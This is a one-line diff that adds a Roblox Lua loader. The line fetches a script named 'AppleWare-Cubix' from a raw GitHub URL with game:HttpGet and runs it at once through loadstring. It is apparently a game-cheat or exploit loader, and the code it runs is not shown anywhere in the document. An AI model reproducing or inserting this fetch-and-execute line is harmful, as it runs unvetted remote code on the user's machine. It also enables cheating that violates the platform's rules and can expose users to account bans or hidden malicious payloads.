@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/1dontgiveaf/testscript69/raw/main/AppleWare-Cubix", true))()
